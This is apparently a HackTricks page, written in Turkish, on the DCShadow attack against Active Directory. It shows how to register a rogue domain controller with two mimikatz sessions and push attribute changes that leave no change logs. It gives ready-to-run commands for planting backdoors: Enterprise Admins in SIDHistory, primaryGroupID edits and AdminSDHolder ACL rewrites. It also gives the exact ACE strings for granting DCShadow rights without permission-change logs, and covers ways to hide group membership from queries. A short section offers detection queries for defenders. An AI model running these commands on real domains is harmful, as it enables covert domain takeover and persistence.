# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Temel Bilgiler

AD ortamına **yeni bir Domain Controller** kaydeder ve bunu, herhangi bir **değişiklik** kaydı bırakmadan belirtilen nesnelerdeki **öznitelikleri** (SIDHistory, SPNs...) **push** etmek için kullanır. **DA** ayrıcalıklarına sahip olmanız ve **root domain** içinde bulunmanız gerekir.\
Yanlış veriler kullanırsanız oldukça kötü görünümlü loglar oluşacağını unutmayın.<sup>[[2]](#references)</sup>

Saldırıyı gerçekleştirmek için 2 mimikatz instance'ına ihtiyacınız vardır. Bunlardan biri SYSTEM ayrıcalıklarıyla RPC sunucularını başlatır (gerçekleştirmek istediğiniz değişiklikleri burada belirtmeniz gerekir), diğer instance ise değerleri push etmek için kullanılır:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
`elevate::token` komutunun `mimikatz1` session'ında çalışmayacağını unutmayın; çünkü bu, thread'in ayrıcalıklarını yükseltir, ancak bizim process'in **privilege**'ını yükseltmemiz gerekir.\
Ayrıca bir "LDAP" object seçebilirsiniz: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Değişiklikleri bir DA üzerinden veya aşağıdaki minimum izinlere sahip bir user üzerinden push edebilirsiniz:

- **domain object** içinde:
- _DS-Install-Replica_ (Add/Remove Replica in Domain)
- _DS-Replication-Manage-Topology_ (Manage Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchornization)
- **Configuration container** içindeki **Sites object** (ve child'ları):
- _CreateChild and DeleteChild_
- DC olarak kayıtlı olan **computer** object'i:
- _WriteProperty_ (Not Write)
- **target object**:
- _WriteProperty_ (Not Write)

Ayrıcalıksız bir user'a bu izinleri vermek için [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) kullanabilirsiniz (bunun bazı log'lar bırakacağını unutmayın). Bu, DA izinlerine sahip olmaktan çok daha kısıtlayıcıdır.\
Örneğin: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Bu, _**student1**_ username'i _**mcorp-student1**_ makinesinde log on olduğunda **root1user** object'i üzerinde DCShadow izinlerine sahip olacağı anlamına gelir.

## DCShadow kullanarak backdoor'lar oluşturma
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Primary group abuse, enumeration gaps ve detection

- `primaryGroupID`, grup `member` listesinden ayrı bir attribute'tur. DCShadow/DSInternals bunu doğrudan yazabilir (örneğin **Domain Admins** için `primaryGroupID=512` ayarlayabilir); on-box LSASS enforcement olmadan bunu gerçekleştirebilir. Ancak AD kullanıcıyı yine de **taşır**: PGID değiştirildiğinde kullanıcı önceki primary group üyeliğinden her zaman çıkarılır (hedef grup ne olursa olsun aynı davranış geçerlidir); dolayısıyla eski primary-group üyeliğini koruyamazsınız.<sup>[[1]](#references)</sup>
- Varsayılan araçlar bir kullanıcının mevcut primary group'undan çıkarılmasını engeller (`ADUC`, `Remove-ADGroupMember`); bu nedenle PGID değişikliği genellikle doğrudan directory write işlemleri gerektirir (DCShadow/`Set-ADDBPrimaryGroup`).
- Membership reporting tutarsızdır:
- **Primary-group-derived üyeleri içerir:** `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Primary-group-derived üyeleri içermez:** `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit ile `member` incelenmesi, `Get-ADUser <user> -Properties memberOf`.
- Recursive kontroller, **primary group** kendisi nested olduğunda primary-group üyelerini gözden kaçırabilir (örneğin kullanıcının PGID'si Domain Admins içindeki nested bir grubu gösteriyorsa); `Get-ADGroupMember -Recursive` veya LDAP recursive filter'ları, recursion primary group'ları açıkça çözümlemediği sürece bu kullanıcıyı döndürmez.
- DACL tricks: attacker'lar user üzerinde `primaryGroupID` için (veya AdminSDHolder kapsamındaki gruplar dışındaki gruplarda `member` attribute'u için) **ReadProperty** iznini deny ederek effective membership bilgisini çoğu PowerShell query'sinden gizleyebilir; `net group` membership'i yine de çözümler. AdminSDHolder tarafından korunan gruplar bu deny'ları sıfırlar.

Detection/monitoring örnekleri:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Privileged groups'u, `Get-ADGroupMember` çıktısını `Get-ADGroup -Properties member` veya ADSI Edit ile karşılaştırarak cross-check edin; böylece `primaryGroupID` ya da gizli attributes nedeniyle oluşan tutarsızlıkları yakalayabilirsiniz.<sup>[[1]](#references)</sup>

## Shadowception - DCShadow kullanarak DCShadow permissions verme (modified permissions logs olmadan)

Kullanıcımızın SID'siyle aşağıdaki ACE'leri sona eklememiz gerekiyor:<sup>[[2]](#references)</sup>

- Domain object üzerinde:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Attacker computer object üzerinde: `(A;;WP;;;UserSID)`
- Target user object üzerinde: `(A;;WP;;;UserSID)`
- Configuration container içindeki Sites object üzerinde: `(A;CI;CCDC;;;UserSID)`

Bir object'in mevcut ACE'sini almak için: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Bu durumda yalnızca bir değil, **birkaç değişiklik** yapmanız gerektiğine dikkat edin. Bu nedenle **mimikatz1 session**'ında (RPC server), yapmak istediğiniz her değişiklikle birlikte **`/stack` parametresini** kullanın. Böylece rogue server'da biriken tüm değişiklikleri gerçekleştirmek için yalnızca bir kez **`/push`** kullanmanız yeterli olacaktır.

[**ired.team'de DCShadow hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

## References

- [1] [TrustedSec - Adventures in Primary Group Behavior, Reporting, and Exploitation](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [DCShadow write-up in ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
